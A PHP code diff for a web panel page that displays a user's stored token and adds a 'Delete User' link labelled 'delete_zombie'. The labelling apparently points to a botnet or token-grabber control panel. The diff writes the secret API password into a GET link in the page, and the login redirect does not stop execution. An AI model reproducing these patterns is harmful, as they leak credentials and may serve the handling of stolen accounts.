@@ -1,11 +1,11 @@
 <?php
 
     require_once('Inc/fonctions.php');
+    global $api_password;
 
     if(!CheckLogin()){
         header('Location: login');
     }
-
 
     if(isset($_GET['id']) && !empty($_GET['id'])) {
         if(strlen($_GET['id']) == 18) {
@@ -15,6 +15,9 @@
             $req->execute(array(htmlspecialchars($_GET['id'])));
             $user = $req->fetch();
 
+            if($req->rowCount() == 0){
+                header('Location: tokens'); die();
+            }
         } else {
             header('Location: tokens'); die();
         }
@@ -80,6 +83,9 @@
                 <div class="custom-input token-input">
                     <label>Token: </label>
                     <input id="user_token" disabled type="text" value="<?=$user['token']?>" class="select-input">
+                    <div class="btn">
+                        <a class="delete_zombie" href="api?type=removetoken&token=<?=$user['token']?>&password=<?=$api_password?>">Delete User</a>
+                    </div>
                 </div>
             </div>
         </div>
